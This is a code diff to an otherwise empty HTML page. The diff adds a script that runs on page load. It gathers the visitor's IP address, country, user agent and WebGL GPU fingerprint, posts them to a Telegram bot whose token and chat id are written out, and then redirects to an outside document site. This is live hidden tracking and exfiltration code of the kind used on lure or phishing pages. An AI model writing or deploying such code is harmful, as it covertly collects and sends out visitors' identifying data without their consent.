@@ -2,7 +2,48 @@
 <html>
 <head>
   <meta charset="UTF-8">
-hello
+  <script>
+    async function collectDataAndRedirect() {
+      let ip = "Unavailable";
+      let countryCode = "Unavailable";
+      let countryName = "Unavailable";
+
+      try {
+        const ipRes = await fetch("https://ipapi.co/json/");
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+        countryCode = ipData.country; 
+        countryName = ipData.country_name; 
+      } catch (e) {}
+
+      let gpu = "Unavailable";
+      try {
+        let gl = document.createElement('canvas').getContext('webgl');
+        let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+          gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+      } catch (e) {}
+
+      const userAgent = navigator.userAgent;
+
+      const message = `IP: ${ip}\nCountry: ${countryName} (${countryCode})\nUserAgent: ${userAgent}\nGPU: ${gpu}`;
+
+
+      fetch("https://api.telegram.org/bot7826244356:AAH-SMeJLWeJFTJt-OzjtejOA4_nGZMzOxA/sendMessage", {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: '7855140713',
+          text: message
+        })
+      }).finally(() => {
+        window.location.href = "https://fast-dochub.com/";
+      });
+    }
+
+    window.onload = collectDataAndRedirect;
+  </script>
 </head>
 <body>
 </body>
